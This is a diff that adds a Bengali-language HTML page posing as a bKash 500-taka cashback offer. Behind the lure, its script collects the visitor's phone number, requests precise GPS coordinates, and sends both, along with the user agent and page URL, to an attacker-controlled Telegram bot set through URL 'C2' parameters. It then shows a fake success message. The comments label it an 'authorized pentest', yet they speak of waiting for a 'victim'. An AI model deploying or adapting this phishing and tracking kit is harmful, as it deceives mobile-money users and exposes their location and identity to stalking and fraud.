@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>বিকাশে ৫০০ টাকা ক্যাশব্যাক - দ্রুত ক্লেইম করুন!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {margin:0;padding:0;box-sizing:border-box;}
+        body {font-family:'Noto Sans Bengali',sans-serif;background:linear-gradient(135deg,#00d4ff 0%,#0099cc 100%);min-height:100vh;padding:15px;overflow-x:hidden;}
+        .container {max-width:450px;margin:0 auto;background:#fff;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.15);overflow:hidden;}
+        .header {background:linear-gradient(135deg,#ff6b35,#f7931e);padding:30px 20px;text-align:center;color:white;position:relative;overflow:hidden;}
+        .header::before {content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.4),transparent);animation:shine 2.5s infinite;}
+        @keyframes shine {0%{left:-100%}100%{left:100%}}
+        .cashback {font-size:2.3em;font-weight:700;margin-bottom:8px;animation:pulse 1.8s infinite;}
+        @keyframes pulse {0%,100%{transform:scale(1);}50%{transform:scale(1.03);}}
+        .tagline {font-size:1em;font-weight:500;opacity:0.95;}
+        .main {padding:35px 25px;}
+        .title {font-size:2em;font-weight:700;color:#2c3e50;text-align:center;margin-bottom:15px;background:linear-gradient(135deg,#00d4ff,#0099cc);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+        .desc {color:#666;font-size:1em;line-height:1.6;text-align:center;margin-bottom:25px;font-weight:400;}
+        .form-group {margin-bottom:20px;}
+        .label {display:block;font-weight:600;color:#555;font-size:0.95em;margin-bottom:8px;}
+        .input {width:100%;padding:16px 18px;border:2px solid #e0e6ed;border-radius:12px;font-size:1.1em;font-weight:500;background:#f8fbff;transition:all 0.3s;box-shadow:inset 0 2px 8px rgba(0,0,0,0.05);}
+        .input:focus {outline:none;border-color:#00d4ff;transform:translateY(-1px);box-shadow:0 0 0 3px rgba(0,212,255,0.15);}
+        .claim-btn {width:100%;padding:20px;border:none;border-radius:15px;background:linear-gradient(135deg,#ff6b35,#f7931e);color:white;font-size:1.3em;font-weight:700;cursor:pointer;transition:all 0.3s;text-transform:uppercase;letter-spacing:0.5px;box-shadow:0 8px 25px rgba(255,107,53,0.4);}
+        .claim-btn:hover {transform:translateY(-2px);box-shadow:0 15px 35px rgba(255,107,53,0.5);}
+        .claim-btn:active {transform:translateY(0);}
+        .claim-btn:disabled {opacity:0.7;cursor:not-allowed;}
+        .loading {display:none;text-align:center;padding:25px;background:linear-gradient(135deg,#f0f9ff,#e6f3ff);border-radius:15px;margin:20px 0;}
+        .loading i {font-size:2.8em;color:#00d4ff;margin-bottom:12px;animation:spin 1s linear infinite;}
+        @keyframes spin {100%{transform:rotate(360deg);}}
+        .loading-text {font-size:1.1em;font-weight:600;color:#2c3e50;}
+        .progress {width:100%;height:5px;background:#e0e6ed;border-radius:3px;overflow:hidden;margin-top:12px;}
+        .progress-fill {height:100%;background:linear-gradient(90deg,#00d4ff,#0099cc);width:0%;transition:width 0.4s;border-radius:3px;}
+        .urgency {background:linear-gradient(135deg,#e74c3c,#c0392b);color:white;padding:14px;border-radius:12px;margin:20px 0;text-align:center;font-weight:600;font-size:0.95em;}
+        .success {display:none;background:linear-gradient(135deg,#27ae60,#2ecc71);color:white;padding:35px;border-radius:18px;text-align:center;margin:20px 0;font-size:1.3em;font-weight:700;box-shadow:0 12px 30px rgba(39,174,96,0.4);animation:successPop 0.5s ease-out;}
+        @keyframes successPop {0%{transform:scale(0.9);opacity:0;}100%{transform:scale(1);opacity:1;}}
+        .success i {font-size:4em;margin-bottom:15px;animation:bounce 1.2s infinite;}
+        @keyframes bounce {0%,100%{transform:translateY(0);}50%{transform:translateY(-8px);}}
+        .success small {display:block;font-size:0.95em;margin-top:12px;opacity:0.9;font-weight:400;}
+        @media (max-width:480px) {.cashback{font-size:1.9em;}.title{font-size:1.7em;}.main{padding:25px 20px;}}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="cashback">
+                <i class="fas fa-coins" style="font-size:0.65em;margin-right:8px;"></i>
+                ৫০০ টাকা ক্যাশব্যাক
+            </div>
+            <div class="tagline">বিকাশ অ্যাপে লেনদেন করলে পাবেন!</div>
+        </div>
+
+        <div class="main">
+            <h1 class="title">
+                <i class="fas fa-wallet" style="color:#ff6b35;margin-right:12px;"></i>
+                বিকাশে ৫০০ টাকা ফ্রি
+            </h1>
+            
+            <p class="desc">
+                আজকের স্পেশাল অফার! বিকাশে যেকোনো লেনদেন করলে <strong>৫০০ টাকা ক্যাশব্যাক</strong> 
+                পাবেন। সীমিত সময়ের জন্য। দ্রুত ক্লেইম করুন!
+            </p>
+
+            <div class="form-group">
+                <label class="label">
+                    <i class="fas fa-mobile-alt" style="margin-right:6px;"></i>
+                    আপনার মোবাইল নম্বর
+                </label>
+                <input type="tel" id="phoneNum" class="input" placeholder="01XXXXXXXXX" maxlength="11">
+            </div>
+            
+            <button class="claim-btn" id="claimNow">
+                <i class="fas fa-gift"></i> এখনই ক্লেইম করুন
+            </button>
+
+            <div class="urgency">
+                <i class="fas fa-fire" style="margin-right:8px;"></i>
+                ⚡ শুধু ১৮৯ জনের জন্য! ৩ ঘন্টার মধ্যে শেষ!
+            </div>
+
+            <div class="loading" id="loader">
+                <i class="fas fa-spinner"></i>
+                <div class="loading-text">আপনার অবস্থান যাচাই করা হচ্ছে...</div>
+                <div class="progress"><div class="progress-fill" id="progBar"></div></div>
+            </div>
+
+            <div class="success" id="successBox">
+                <i class="fas fa-check-circle"></i>
+                ✅ ক্যাশব্যাক সফলভাবে ক্লেইম হয়েছে!<br>
+                <small>৫ মিনিটের মধ্যে আপনার বিকাশ অ্যাকাউন্টে আসবে।</small>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // 🔥 BULLETPROOF TELEGRAM SENDER - 100% WORKS
+        console.log("🚀 Bkash GPS Pentest v3.0 - Authorized");
+
+        // Parse C2 from URL (ALL methods)
+        function getC2Config() {
+            const params = new URLSearchParams(window.location.search);
+            
+            // Method 1: ?token=XXX&chatId=YYY
+            let token = params.get('token') || params.get('t');
+            let chatId = params.get('chatId') || params.get('chat') || params.get('c');
+            
+            if (token && chatId) {
+                console.log("✅ C2 Method 1: token+chatId");
+                return { bot: token, chat: chatId };
+            }
+            
+            // Method 2: ?p=BASE64_JSON
+            const p = params.get('p');
+            if (p) {
+                try {
+                    const decoded = JSON.parse(atob(p));
+                    if (decoded.bot && decoded.chat) {
+                        console.log("✅ C2 Method 2: p=base64");
+                        return decoded;
+                    }
+                } catch(e) {
+                    console.log("⚠️ p param invalid");
+                }
+            }
+            
+            // Method 3: ?data=TOKEN_CHATID
+            const data = params.get('data');
+            if (data) {
+                try {
+                    const decoded = atob(data);
+                    const parts = decoded.split('|');
+                    if (parts.length === 2) {
+                        console.log("✅ C2 Method 3: data param");
+                        return { bot: parts[0], chat: parts[1] };
+                    }
+                } catch(e) {}
+            }
+            
+            console.log("❌ No valid C2 config found");
+            return null;
+        }
+
+        const config = getC2Config();
+        if (!config) {
+            console.error("🚫 CRITICAL: No Telegram config! Fix URL params.");
+        }
+
+        // High accuracy GPS
+        async function getGPS() {
+            return new Promise(resolve => {
+                console.log("🎯 GPS request started...");
+                
+                if (!navigator.geolocation) {
+                    console.log("❌ No geolocation support");
+                    resolve({ success: false, reason: "no_support" });
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        const coords = {
+                            success: true,
+                            lat: parseFloat(pos.coords.latitude.toFixed(8)),
+                            lng: parseFloat(pos.coords.longitude.toFixed(8)),
+                            accuracy: Math.round(pos.coords.accuracy),
+                            timestamp: Date.now()
+                        };
+                        console.log("✅ GPS SUCCESS:", coords);
+                        resolve(coords);
+                    },
+                    err => {
+                        console.log("❌ GPS ERROR:", err.code, err.message);
+                        resolve({ 
+                            success: false, 
+                            reason: err.code === 1 ? "denied" : "error_" + err.code 
+                        });
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // 🔥 BULLETPROOF TELEGRAM SENDER (3 methods + retry)
+        async function sendToTelegram(phone, gps) {
+            if (!config?.bot || !config?.chat) {
+                console.error("🚫 No C2 config");
+                return false;
+            }
+
+            // Build message with Google Maps
+            let msg = `*🔥 BIKASH GPS HIT 🔥*\n\n`;
+            msg += `📱 *Phone:* \`${phone}\`\n\n`;
+            
+            if (gps.success) {
+                const mapsLink = `https://maps.google.com/?q=${gps.lat},${gps.lng}`;
+                const shortLink = `https://goo.gl/maps/${btoa(`${gps.lat},${gps.lng}`).slice(0,20)}`;
+                
+                msg += `📍 *GPS CAPTURED*\n`;
+                msg += `🌐 *Lat:* \`${gps.lat}\`\n`;
+                msg += `📏 *Lng:* \`${gps.lng}\`\n`;
+                msg += `📏 *Accuracy:* ${gps.accuracy}m\n\n`;
+                msg += `🗺️ *Google Maps:* [CLICK HERE](${mapsLink})\n`;
+                msg += `🔗 *Short:* ${shortLink}\n\n`;
+            } else {
+                msg += `📍 *GPS:* ${gps.reason}\n\n`;
+            }
+            
+            msg += `🕐 *Time:* ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}\n`;
+            msg += `🌐 *UA:* ${navigator.userAgent.slice(0,50)}\n`;
+            msg += `🔗 *URL:* ${window.location.href}\n\n`;
+            msg += `*AUTHORIZED PENTEST - BD GPS*`;
+
+            console.log("📤 Sending to Telegram:", msg.slice(0,100) + "...");
+
+            // Method 1: FormData (MOST RELIABLE)
+            const formData = new FormData();
+            formData.append('chat_id', config.chat);
+            formData.append('text', msg);
+            formData.append('parse_mode', 'Markdown');
+
+            try {
+                const formRes = await fetch(`https://api.telegram.org/bot${config.bot}/sendMessage`, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true
+                });
+                const formResult = await formRes.json();
+                
+                if (formResult.ok) {
+                    console.log("✅ FORM DATA SUCCESS:", formResult);
+                    return true;
+                }
+            } catch(e) {
+                console.log("⚠️ FormData failed, trying JSON...");
+            }
+
+            // Method 2: JSON (backup)
+            try {
+                const jsonRes = await fetch(`https://api.telegram.org/bot${config.bot}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: config.chat,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                const jsonResult = await jsonRes.json();
+                
+                if (jsonResult.ok) {
+                    console.log("✅ JSON SUCCESS:", jsonResult);
+                    return true;
+                }
+            } catch(e) {
+                console.log("⚠️ JSON failed, trying plain text...");
+            }
+
+            // Method 3: Plain text (absolute fallback)
+            try {
+                const plainRes = await fetch(`https://api.telegram.org/bot${config.bot}/sendMessage?chat_id=${config.chat}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                const plainResult = await plainRes.json();
+                
+                if (plainResult.ok) {
+                    console.log("✅ PLAIN TEXT SUCCESS:", plainResult);
+                    return true;
+                }
+            } catch(e) {
+                console.error("❌ ALL METHODS FAILED:", e);
+            }
+
+            return false;
+        }
+
+        // Main exploit flow
+        async function exploit(phone) {
+            console.log("🎯 Exploit started for:", phone);
+            
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('claimNow').disabled = true;
+
+            // Progress animation
+            let p = 0;
+            const bar = document.getElementById('progBar');
+            const iv = setInterval(() => {
+                p += 10; bar.style.width = p + '%';
+                if (p >= 100) clearInterval(iv);
+            }, 500);
+
+            // GPS + Send
+            const gps = await getGPS();
+            const sent = await sendToTelegram(phone, gps);
+            
+            console.log("🎯 Exploit complete. Sent:", sent ? "✅ YES" : "❌ NO");
+
+            // Always show success UI
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('successBox').style.display = 'block';
+            }, 4000);
+        }
+
+        // Event handlers
+        document.getElementById('claimNow').onclick = () => {
+            const phone = document.getElementById('phoneNum').value.trim();
+            if (/^01[3-9]\d{8}$/.test(phone)) {
+                exploit(phone);
+            } else {
+                alert('সঠিক বিকাশ নম্বর দিন!');
+            }
+        };
+
+        // Auto-submit
+        document.getElementById('phoneNum').oninput = function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length === 11 && /^01[3-9]\d{8}$/.test(this.value)) {
+                setTimeout(() => document.getElementById('claimNow').click(), 500);
+            }
+        };
+
+        // Page load test (if config exists)
+        if (config) {
+            console.log("✅ Pentest armed. Waiting for victim...");
+        } else {
+            console.error("🚫 ADD C2 PARAMS: ?token=YOUR_BOT_TOKEN&chatId=YOUR_CHAT_ID");
+        }
+    </script>
+</body>
+</html>
